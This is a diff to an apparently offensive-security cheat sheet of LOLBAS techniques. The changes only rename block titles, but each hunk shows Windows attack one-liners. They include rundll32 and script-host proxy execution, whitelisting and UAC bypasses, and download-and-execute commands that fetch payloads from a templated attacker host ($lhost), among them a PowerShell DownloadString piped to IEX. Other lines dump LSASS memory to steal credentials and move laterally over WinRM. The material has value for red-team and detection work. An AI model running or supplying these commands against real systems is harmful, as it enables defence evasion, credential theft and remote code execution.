+```cmd title:"Lolbas Execute control.exe in the current working directory"
 WorkFolders
 ```
 <!-- cheat
@@ -4492,7 +4492,7 @@ WorkFolders
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"WorkFolders attempts to execute control.exe"
+```cmd title:"Lolbas WorkFolders attempts to execute control.exe"
 reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /ve /d "$file_in" /f
 WorkFolders
 ```
@@ -4515,7 +4515,7 @@ Executes a binary provided in default value of `HKCU\Software\Microsoft\Windows\
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Executes a binary provided in default value of HKCU\Software\Microsoft\Windows\CurrentVersion\App…"
+```cmd title:"Lolbas write.exe Execute"
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\wordpad.exe" /ve /d "$file_in" /f
 write.exe
 ```
@@ -4537,7 +4537,7 @@ Execute script stored in an alternate data stream
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Execute script stored in an alternate data stream"
+```cmd title:"Lolbas Execute script stored in an alternate data stream"
 wscript //e:vbscript $file_out:script.vbs
 ```
 <!-- cheat
@@ -4550,7 +4550,7 @@ Download and execute script stored in an alternate data stream
 
 *Privileges: User • MITRE: T1564.004*
 
-```cmd title:"Download and execute script stored in an alternate data stream"
+```cmd title:"Lolbas Download and execute script stored in an alternate data stream"
 echo GetObject("script:$scheme://$lhost:$lport/$file") > $file_out:hi.js && wscript.exe $file_out:hi.js
 ```
 <!-- cheat
@@ -4574,7 +4574,7 @@ During startup, wsreset.exe checks the registry value HKCU\Software\Classes\AppX
 
 *Privileges: User • MITRE: T1548.002*
 
-```cmd title:"During startup, wsreset.exe checks the registry value…"
+```cmd title:"Lolbas Wsreset.exe UAC Bypass"
 wsreset.exe
 ```
 <!-- cheat
@@ -4593,7 +4593,7 @@ Execute a command via Windows Terminal.
 
 *Privileges: User • MITRE: T1202*
 
-```cmd title:"Execute a command via Windows Terminal"
+```cmd title:"Lolbas Execute a command via Windows Terminal"
 wt.exe $cmd
 ```
 <!-- cheat
@@ -4614,7 +4614,7 @@ Loads and executes DLL code on attach.
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Loads and executes DLL code on attach"
+```cmd title:"Lolbas Loads and executes DLL code on attach"
 wuauclt.exe /UpdateDeploymentProvider $file_out /RunHandlerComServer
 ```
 <!-- cheat
@@ -4635,7 +4635,7 @@ Xwizard.exe running a custom class that has been added to the registry.
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Xwizard.exe running a custom class that has been added to the registry"
+```cmd title:"Lolbas Xwizard.exe running a custom class that has been added to the registry"
 xwizard RunWizard $00000001_0000_0000_0000_0000feedacdc
 ```
 <!-- cheat
@@ -4648,7 +4648,7 @@ Xwizard.exe running a custom class that has been added to the registry. The /t a
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Xwizard.exe running a custom class that has been added to the registry"
+```cmd title:"Lolbas Xwizard.exe running a custom class that has been added to the registry"
 xwizard RunWizard /taero /u $00000001_0000_0000_0000_0000feedacdc
 ```
 <!-- cheat
@@ -4661,7 +4661,7 @@ Xwizard.exe uses RemoteApp and Desktop Connections wizard to download a file, an
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Xwizard.exe uses RemoteApp and Desktop Connections wizard to download a file, and save it to…"
+```cmd title:"Lolbas Xwizard.exe Download #3"
 xwizard RunWizard $7940acf8_60ba_4213_a7c3_f3b400ee266d /z$scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -4688,7 +4688,7 @@ Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the 
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by…"
+```cmd title:"Lolbas Advpack.dll AWL Bypass #1"
 rundll32.exe advpack.dll,LaunchINFSection $file_out,DefaultInstall_SingleUser,1,
 ```
 <!-- cheat
@@ -4701,7 +4701,7 @@ Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the 
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by…"
+```cmd title:"Lolbas Advpack.dll AWL Bypass #2"
 rundll32.exe advpack.dll,LaunchINFSection $file_out,,1,
 ```
 <!-- cheat
@@ -4714,7 +4714,7 @@ Launch a DLL payload by calling the RegisterOCX function.
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Launch a DLL payload by calling the RegisterOCX function"
+```cmd title:"Lolbas Launch a DLL payload by calling the RegisterOCX function"
 rundll32.exe advpack.dll,RegisterOCX $file_out
 ```
 <!-- cheat
@@ -4727,7 +4727,7 @@ Launch an executable by calling the RegisterOCX function.
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Launch an executable by calling the RegisterOCX function"
+```cmd title:"Lolbas Launch an executable by calling the RegisterOCX function"
 rundll32.exe advpack.dll,RegisterOCX $file_out
 ```
 <!-- cheat
@@ -4740,7 +4740,7 @@ Launch command line by calling the RegisterOCX function.
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Launch command line by calling the RegisterOCX function"
+```cmd title:"Lolbas Launch command line by calling the RegisterOCX function"
 rundll32 advpack.dll, RegisterOCX $cmd
 ```
 <!-- cheat
@@ -4760,7 +4760,7 @@ Calls the MiniDump exported function of comsvcs.dll, which in turns calls MiniDu
 
 *Privileges: SYSTEM • MITRE: T1003.001*
 
-```cmd title:"Calls the MiniDump exported function of comsvcs.dll, which in turns calls MiniDumpWriteDump"
+```cmd title:"Lolbas Calls the MiniDump exported function of comsvcs.dll, which in turns calls MiniDumpWriteDump"
 rundll32 C:\windows\system32\comsvcs.dll MiniDump $lsass_pid dump.bin full
 ```
 <!-- cheat
@@ -4781,7 +4781,7 @@ Launch an executable with a .scr extension by calling the InstallScreenSaver fun
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Launch an executable with a .scr extension by calling the InstallScreenSaver function"
+```cmd title:"Lolbas Launch an executable with a .scr extension by calling the InstallScreenSaver function"
 rundll32.exe desk.cpl,InstallScreenSaver $file_out
 ```
 <!-- cheat
@@ -4794,7 +4794,7 @@ Launch a remote executable with a .scr extension, located on an SMB share, by ca
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Launch a remote executable with a .scr extension, located on an SMB share, by calling the…"
+```cmd title:"Lolbas Desk.cpl Execute #2"
 rundll32.exe desk.cpl,InstallScreenSaver \\$lhost\$share\$file
 ```
 <!-- cheat
@@ -4819,7 +4819,7 @@ Executes click-once-application from URL (trampoline for Dfsvc.exe, DotNet Click
 
 *Privileges: User • MITRE: T1127.002*
 
-```cmd title:"Executes click-once-application from URL (trampoline for Dfsvc.exe, DotNet ClickOnce host)"
+```cmd title:"Lolbas Executes click-once-application from URL (trampoline for Dfsvc.exe, DotNet ClickOnce host)"
 rundll32.exe dfshim.dll,ShOpenVerbApplication $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -4843,7 +4843,7 @@ Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the 
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by…"
+```cmd title:"Lolbas Ieadvpack.dll AWL Bypass #1"
 rundll32.exe ieadvpack.dll,LaunchINFSection $file_out,DefaultInstall_SingleUser,1,
 ```
 <!-- cheat
@@ -4856,7 +4856,7 @@ Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the 
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by…"
+```cmd title:"Lolbas Ieadvpack.dll AWL Bypass #2"
 rundll32.exe ieadvpack.dll,LaunchINFSection $file_out,,1,
 ```
 <!-- cheat
@@ -4869,7 +4869,7 @@ Launch a DLL payload by calling the RegisterOCX function.
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Launch a DLL payload by calling the RegisterOCX function"
+```cmd title:"Lolbas Launch a DLL payload by calling the RegisterOCX function"
 rundll32.exe ieadvpack.dll,RegisterOCX $file_out
 ```
 <!-- cheat
@@ -4882,7 +4882,7 @@ Launch an executable by calling the RegisterOCX function.
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Launch an executable by calling the RegisterOCX function"
+```cmd title:"Lolbas Launch an executable by calling the RegisterOCX function"
 rundll32.exe ieadvpack.dll,RegisterOCX $file_out
 ```
 <!-- cheat
@@ -4895,7 +4895,7 @@ Launch command line by calling the RegisterOCX function.
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Launch command line by calling the RegisterOCX function"
+```cmd title:"Lolbas Launch command line by calling the RegisterOCX function"
 rundll32 ieadvpack.dll, RegisterOCX $cmd
 ```
 <!-- cheat
@@ -4916,7 +4916,7 @@ Launch an executable payload via proxy through a(n) URL (information) file by ca
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Launch an executable payload via proxy through a(n) URL (information) file by calling OpenURL"
+```cmd title:"Lolbas Launch an executable payload via proxy through a(n) URL (information) file by calling OpenURL"
 rundll32.exe ieframe.dll,OpenURL $file_out
 ```
 <!-- cheat
@@ -4937,7 +4937,7 @@ Invoke an HTML Application via mshta.exe (note: pops a security warning and a pr
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Invoke an HTML Application via mshta.exe (note: pops a security warning and a print dialogue box)"
+```cmd title:"Lolbas Invoke an HTML Application via mshta.exe (note: pops a security warning and a print dialogue box)"
 rundll32.exe Mshtml.dll,PrintHTML $file_out
 ```
 <!-- cheat
@@ -4958,7 +4958,7 @@ Launch executable by calling the LaunchApplication function.
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Launch executable by calling the LaunchApplication function"
+```cmd title:"Lolbas Launch executable by calling the LaunchApplication function"
 rundll32.exe pcwutl.dll,LaunchApplication $file_out
 ```
 <!-- cheat
@@ -4979,7 +4979,7 @@ Once executed, rundll32.exe will download the file at the specified URL to the u
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Once executed, rundll32.exe will download the file at the specified URL to the user's INetCache…"
+```cmd title:"Lolbas PhotoViewer.dll Download"
 rundll32.exe "C:\Program Files\Windows Photo Viewer\PhotoViewer.dll",ImageView_Fullscreen $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -5003,7 +5003,7 @@ Once executed, scrobj.dll attempts to load a file from the URL and saves it to I
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Once executed, scrobj.dll attempts to load a file from the URL and saves it to INetCache"
+```cmd title:"Lolbas Once executed, scrobj.dll attempts to load a file from the URL and saves it to INetCache"
 rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -5027,7 +5027,7 @@ Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the 
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by…"
+```cmd title:"Lolbas Setupapi.dll AWL Bypass #1"
 rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 $file_out
 ```
 <!-- cheat
@@ -5040,7 +5040,7 @@ Launch an executable file via the InstallHinfSection function and .inf file sect
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Launch an executable file via the InstallHinfSection function and .inf file section directive"
+```cmd title:"Lolbas Launch an executable file via the InstallHinfSection function and .inf file section directive"
 rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 $file_out
 ```
 <!-- cheat
@@ -5061,7 +5061,7 @@ Launch an executable payload via proxy through a URL (information) file by calli
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Launch an executable payload via proxy through a URL (information) file by calling OpenURL"
+```cmd title:"Lolbas Launch an executable payload via proxy through a URL (information) file by calling OpenURL"
 rundll32.exe shdocvw.dll,OpenURL $file_out
 ```
 <!-- cheat
@@ -5082,7 +5082,7 @@ Launch a DLL payload by calling the Control_RunDLL function.
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Launch a DLL payload by calling the Control_RunDLL function"
+```cmd title:"Lolbas Launch a DLL payload by calling the Control_RunDLL function"
 rundll32.exe shell32.dll,Control_RunDLL $file_out
 ```
 <!-- cheat
@@ -5095,7 +5095,7 @@ Launch an executable by calling the ShellExec_RunDLL function.
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Launch an executable by calling the ShellExec_RunDLL function"
+```cmd title:"Lolbas Launch an executable by calling the ShellExec_RunDLL function"
 rundll32.exe shell32.dll,ShellExec_RunDLL $file_out
 ```
 <!-- cheat
@@ -5108,7 +5108,7 @@ Launch command line by calling the ShellExec_RunDLL function.
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Launch command line by calling the ShellExec_RunDLL function"
+```cmd title:"Lolbas Launch command line by calling the ShellExec_RunDLL function"
 rundll32 SHELL32.DLL,ShellExec_RunDLL $file_out $cmd
 ```
 <!-- cheat
@@ -5122,7 +5122,7 @@ Load a DLL/CPL by calling undocumented Control_RunDLLNoFallback function.
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Load a DLL/CPL by calling undocumented Control_RunDLLNoFallback function"
+```cmd title:"Lolbas Load a DLL/CPL by calling undocumented Control_RunDLLNoFallback function"
 rundll32.exe shell32.dll,#44 $file_out
 ```
 <!-- cheat
@@ -5143,7 +5143,7 @@ Once executed, rundll32.exe will download the file at the URL in the command to 
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Once executed, rundll32.exe will download the file at the URL in the command to INetCache"
+```cmd title:"Lolbas Once executed, rundll32.exe will download the file at the URL in the command to INetCache"
 rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen $scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -5167,7 +5167,7 @@ Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the 
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by…"
+```cmd title:"Lolbas Syssetup.dll AWL Bypass #1"
 rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 $file_out
 ```
 <!-- cheat
@@ -5180,7 +5180,7 @@ Launch an executable file via the SetupInfObjectInstallAction function and .inf 
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Launch an executable file via the SetupInfObjectInstallAction function and .inf file section…"
+```cmd title:"Lolbas Syssetup.dll Execute #2"
 rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 $file_out
 ```
 <!-- cheat
@@ -5201,7 +5201,7 @@ Launch a HTML application payload by calling OpenURL.
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Launch a HTML application payload by calling OpenURL"
+```cmd title:"Lolbas Launch a HTML application payload by calling OpenURL"
 rundll32.exe url.dll,OpenURL $file_out
 ```
 <!-- cheat
@@ -5214,7 +5214,7 @@ Launch an executable payload via proxy through a .url (information) file by call
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Launch an executable payload via proxy through a .url (information) file by calling OpenURL"
+```cmd title:"Lolbas Launch an executable payload via proxy through a .url (information) file by calling OpenURL"
 rundll32.exe url.dll,OpenURL $file_out
 ```
 <!-- cheat
@@ -5227,7 +5227,7 @@ Launch an executable by calling OpenURL.
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Launch an executable by calling OpenURL"
+```cmd title:"Lolbas Launch an executable by calling OpenURL"
 rundll32.exe url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e
 ```
 <!-- cheat
@@ -5239,7 +5239,7 @@ Launch an executable by calling FileProtocolHandler.
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Launch an executable by calling FileProtocolHandler"
+```cmd title:"Lolbas Launch an executable by calling FileProtocolHandler"
 rundll32.exe url.dll,FileProtocolHandler $file_out
 ```
 <!-- cheat
@@ -5252,7 +5252,7 @@ Launch an executable by calling FileProtocolHandler.
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Launch an executable by calling FileProtocolHandler"
+```cmd title:"Lolbas Launch an executable by calling FileProtocolHandler"
 rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e
 ```
 <!-- cheat
@@ -5264,7 +5264,7 @@ Launch a HTML application payload by calling FileProtocolHandler.
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Launch a HTML application payload by calling FileProtocolHandler"
+```cmd title:"Lolbas Launch a HTML application payload by calling FileProtocolHandler"
 rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta
 ```
 <!-- cheat
@@ -5284,7 +5284,7 @@ Launch an executable payload by calling RouteTheCall.
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Launch an executable payload by calling RouteTheCall"
+```cmd title:"Lolbas Launch an executable payload by calling RouteTheCall"
 rundll32.exe zipfldr.dll,RouteTheCall $file_out
 ```
 <!-- cheat
@@ -5297,7 +5297,7 @@ Launch an executable payload by calling RouteTheCall (obfuscated).
 
 *Privileges: User • MITRE: T1218.011*
 
-```cmd title:"Launch an executable payload by calling RouteTheCall (obfuscated)"
+```cmd title:"Lolbas Launch an executable payload by calling RouteTheCall (obfuscated)"
 rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e
 ```
 <!-- cheat
@@ -5320,7 +5320,7 @@ Import the PowerShell Diagnostic CL_Invocation script and call SyncInvoke to lau
 
 *Privileges: User • MITRE: T1216*
 
-```cmd title:"Import the PowerShell Diagnostic CL_Invocation script and call SyncInvoke to launch an executable"
+```cmd title:"Lolbas Import the PowerShell Diagnostic CL_Invocation script and call SyncInvoke to launch an executable"
 . C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1   \nSyncInvoke $cmd
 ```
 <!-- cheat
@@ -5340,7 +5340,7 @@ Proxy execute Managed DLL with PowerShell
 
 *Privileges: User • MITRE: T1216*
 
-```cmd title:"Proxy execute Managed DLL with PowerShell"
+```cmd title:"Lolbas Proxy execute Managed DLL with PowerShell"
 powershell.exe -ep bypass -command "set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\..\..\..\testing\fun.dll;[Program]::Fun()"
 ```
 <!-- cheat
@@ -5363,7 +5363,7 @@ Import the PowerShell Diagnostic CL_Mutexverifiers script and call runAfterCance
 
 *Privileges: User • MITRE: T1216*
 
-```cmd title:"Import the PowerShell Diagnostic CL_Mutexverifiers script and call runAfterCancelProcess to launch…"
+```cmd title:"Lolbas CL_Mutexverifiers.ps1 Execute"
 . C:\Windows\diagnostics\system\AERO\CL_Mutexverifiers.ps1   \nrunAfterCancelProcess $file_out
 ```
 <!-- cheat
@@ -5384,7 +5384,7 @@ Execute binaries from the context of the signed script using the "VsWherePath" f
 
 *Privileges: User • MITRE: T1216*
 
-```cmd title:"Execute binaries from the context of the signed script using the 'VsWherePath' flag"
+```cmd title:"Lolbas Execute binaries from the context of the signed script using the 'VsWherePath' flag"
 powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsWherePath $file_out
 ```
 <!-- cheat
@@ -5397,7 +5397,7 @@ Execute binaries and commands from the context of the signed script using the "V
 
 *Privileges: User • MITRE: T1216*
 
-```cmd title:"Execute binaries and commands from the context of the signed script using the 'VsInstallationPath'…"
+```cmd title:"Lolbas Launch-VsDevShell.ps1 Execute #2"
 powershell -ep RemoteSigned -f .\Launch-VsDevShell.ps1 -VsInstallationPath "/../../../../../; $file_out ;"
 ```
 <!-- cheat
@@ -5417,7 +5417,7 @@ Set the comspec variable to another executable prior to calling manage-bde.wsf f
 
 *Privileges: User • MITRE: T1216*
 
-```cmd title:"Set the comspec variable to another executable prior to calling manage-bde.wsf for execution"
+```cmd title:"Lolbas Set the comspec variable to another executable prior to calling manage-bde.wsf for execution"
 set comspec=$file_out & cscript c:\windows\system32\manage-bde.wsf
 ```
 <!-- cheat
@@ -5430,7 +5430,7 @@ Run the manage-bde.wsf script with a payload named manage-bde.exe in the same di
 
 *Privileges: User • MITRE: T1216*
 
-```cmd title:"Run the manage-bde.wsf script with a payload named manage-bde.exe in the same directory to run the…"
+```cmd title:"Lolbas Manage-bde.wsf Execute #2"
 copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf
 ```
 <!-- cheat
@@ -5449,7 +5449,7 @@ Execute code using Pester. The third parameter can be anything. The fourth is th
 
 *Privileges: User • MITRE: T1216*
 
-```cmd title:"Execute code using Pester. The third parameter can be anything. The fourth is the payload"
+```cmd title:"Lolbas Execute code using Pester. The third parameter can be anything. The fourth is the payload"
 Pester.bat [/help|?|-?|/?] "$null; $cmd"
 ```
 <!-- cheat
@@ -5462,7 +5462,7 @@ Execute code using Pester. Example here executes specified executable.
 
 *Privileges: User • MITRE: T1216*
 
-```cmd title:"Execute code using Pester. Example here executes specified executable"
+```cmd title:"Lolbas Execute code using Pester. Example here executes specified executable"
 Pester.bat ;$file_out
 ```
 <!-- cheat
@@ -5483,7 +5483,7 @@ Set the 2nd variable with a Script COM moniker to perform Windows Script Host (W
 
 *Privileges: User • MITRE: T1216.001*
 
-```cmd title:"Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection"
+```cmd title:"Lolbas Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection"
 pubprn.vbs $lhost script:$scheme://$lhost:$lport/$file
 ```
 <!-- cheat
@@ -5506,7 +5506,7 @@ Inject PowerShell script code with the provided arguments
 
 *Privileges: User • MITRE: T1216.002*
 
-```cmd title:"Inject PowerShell script code with the provided arguments"
+```cmd title:"Lolbas Inject PowerShell script code with the provided arguments"
 SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('$scheme://$lhost:$lport/$file') | IEX"
 ```
 <!-- cheat
@@ -5529,7 +5529,7 @@ Proxy execute Managed DLL with PowerShell
 
 *Privileges: User • MITRE: T1216*
 
-```cmd title:"Proxy execute Managed DLL with PowerShell"
+```cmd title:"Lolbas Proxy execute Managed DLL with PowerShell"
 powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[Program.Class]::Main()"
 ```
 <!-- cheat
@@ -5549,7 +5549,7 @@ Lateral movement/Remote Command Execution via WMI Win32_Process class over the W
 
 *Privileges: User • MITRE: T1216*
 
-```cmd title:"Lateral movement/Remote Command Execution via WMI Win32_Process class over the WinRM protocol"
+```cmd title:"Lolbas Lateral movement/Remote Command Execution via WMI Win32_Process class over the WinRM protocol"
 winrm invoke Create wmicimv2/Win32_Process @$commandline_cmd -r:http://target:5985
 ```
 <!-- cheat
@@ -5563,7 +5563,7 @@ Lateral movement/Remote Command Execution via WMI Win32_Service class over the W
 
 *Privileges: Admin • MITRE: T1216*
 
-```cmd title:"Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol"
+```cmd title:"Lolbas Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol"
 winrm invoke Create wmicimv2/Win32_Service @$name_evil_displayname_evil_pathname_cmd -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985
 ```
 <!-- cheat
@@ -5577,7 +5577,7 @@ Bypass AWL solutions by copying cscript.exe to an attacker-controlled location; 
 
 *Privileges: User • MITRE: T1220*
 
-```cmd title:"Bypass AWL solutions by copying cscript.exe to an attacker-controlled location; creating a…"
+```cmd title:"Lolbas winrm.vbs AWL Bypass #3"
 %SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty
 ```
 <!-- cheat
@@ -5601,7 +5601,7 @@ Load a managed DLL in the context of AccCheckConsole.exe. The -window switch val
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Load a managed DLL in the context of AccCheckConsole.exe"
+```cmd title:"Lolbas Load a managed DLL in the context of AccCheckConsole.exe"
 AccCheckConsole.exe -window "Untitled - Notepad" $file_out
 ```
 <!-- cheat
@@ -5614,7 +5614,7 @@ Load a managed DLL in the context of AccCheckConsole.exe. The -window switch val
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Load a managed DLL in the context of AccCheckConsole.exe"
+```cmd title:"Lolbas Load a managed DLL in the context of AccCheckConsole.exe"
 AccCheckConsole.exe -window "Untitled - Notepad" $file_out
 ```
 <!-- cheat
@@ -5635,7 +5635,7 @@ Creates a memory dump of the lsass process
 
 *Privileges: SYSTEM • MITRE: T1003.001*
 
-```cmd title:"Creates a memory dump of the lsass process"
+```cmd title:"Lolbas Creates a memory dump of the lsass process"
 adplus.exe -hang -pn lsass.exe -o $dir -quiet
 ```
 <!-- cheat
@@ -5648,7 +5648,7 @@ Execute arbitrary commands using adplus config file (see Resources section for a
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Execute arbitrary commands using adplus config file (see Resources section for a sample file)"
+```cmd title:"Lolbas Execute arbitrary commands using adplus config file (see Resources section for a sample file)"
 adplus.exe -c $file_out
 ```
 <!-- cheat
@@ -5661,7 +5661,7 @@ Dump process memory using adplus config file (see Resources section for a sample
 
 *Privileges: SYSTEM • MITRE: T1003.001*
 
-```cmd title:"Dump process memory using adplus config file (see Resources section for a sample file)"
+```cmd title:"Lolbas Dump process memory using adplus config file (see Resources section for a sample file)"
 adplus.exe -c $file_out
 ```
 <!-- cheat
@@ -5674,7 +5674,7 @@ Execute arbitrary commands and binaries from the context of adplus. Note that pr
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Execute arbitrary commands and binaries from the context of adplus"
+```cmd title:"Lolbas Execute arbitrary commands and binaries from the context of adplus"
 adplus.exe -crash -o "$dir" -sc $file_out
 ```
 <!-- cheat
@@ -5695,7 +5695,7 @@ Spawns powershell.exe and executes a provided powershell script with ExecutionPo
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Spawns powershell.exe and executes a provided powershell script with ExecutionPolicy Bypass argument"
+```cmd title:"Lolbas Spawns powershell.exe and executes a provided powershell script with ExecutionPolicy Bypass argument"
 AgentExecutor.exe -powershell "$file_out" "$file_out" "$file_out" "$file_out" 60000 "C:\Windows\SysWOW64\WindowsPowerShell\v1.0" 0 1
 ```
 <!-- cheat
@@ -5708,7 +5708,7 @@ If we place a binary named powershell.exe in the specified folder path, agentexe
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"If we place a binary named powershell.exe in the specified folder path, agentexecutor.exe will…"
+```cmd title:"Lolbas AgentExecutor.exe Execute #2"
 AgentExecutor.exe -powershell "$file_out" "$file_out" "$file_out" "$file_out" 60000 "$dir" 0 1
 ```
 <!-- cheat
@@ -5730,7 +5730,7 @@ Execute an executable file via the Windows App Certification Kit command-line to
 
 *Privileges: Administrator • MITRE: T1127*
 
-```cmd title:"Execute an executable file via the Windows App Certification Kit command-line tool"
+```cmd title:"Lolbas Execute an executable file via the Windows App Certification Kit command-line tool"
 appcert.exe test -apptype desktop -setuppath $file_out -reportoutputpath $file_out
 ```
 <!-- cheat
@@ -5743,7 +5743,7 @@ Install an MSI file via an msiexec instance spawned via appcert.exe as parent pr
 
 *Privileges: Administrator • MITRE: T1218.007*
 
-```cmd title:"Install an MSI file via an msiexec instance spawned via appcert.exe as parent process"
+```cmd title:"Lolbas Install an MSI file via an msiexec instance spawned via appcert.exe as parent process"
 appcert.exe test -apptype desktop -setuppath $file_out -setupcommandline /q -reportoutputpath $file_out
 ```
 <!-- cheat
@@ -5764,7 +5764,7 @@ Launches an executable via User Experience Virtualization tool.
 
 *Privileges: User • MITRE: T1127*
 
-```cmd title:"Launches an executable via User Experience Virtualization tool"
+```cmd title:"Lolbas Launches an executable via User Experience Virtualization tool"
 AppLauncher.exe $file_out
 ```
 <!-- cheat
@@ -5785,7 +5785,7 @@ Executes .bat file through AppVLP.exe
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Executes .bat file through AppVLP.exe"
+```cmd title:"Lolbas Executes .bat file through AppVLP.exe"
 AppVLP.exe \\$lhost\$share\$file
 ```
 <!-- cheat
@@ -5800,7 +5800,7 @@ Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS 
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command"
+```cmd title:"Lolbas Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command"
 AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('$file_out','', '', 'open', 1)"
 ```
 <!-- cheat
@@ -5826,7 +5826,7 @@ Export binary payload stored in SQL Server database to file system.
 
 *Privileges: User • MITRE: T1105*
 
-```cmd title:"Export binary payload stored in SQL Server database to file system"
+```cmd title:"Lolbas Export binary payload stored in SQL Server database to file system"
 bcp "SELECT payload_data FROM database.dbo.payloads WHERE id=1" queryout "C:\Windows\Temp\payload.exe" -S localhost -T -c
 ```
 <!-- cheat
@@ -5845,7 +5845,7 @@ Execute VBscript code that is referenced within the specified .bgi file.
 
 *Privileges: User • MITRE: T1218*
 
-```cmd title:"Execute VBscript code that is referenced within the specified .bgi file"
+```cmd title:"Lolbas Execute VBscript code that is referenced within the specified .bgi file"
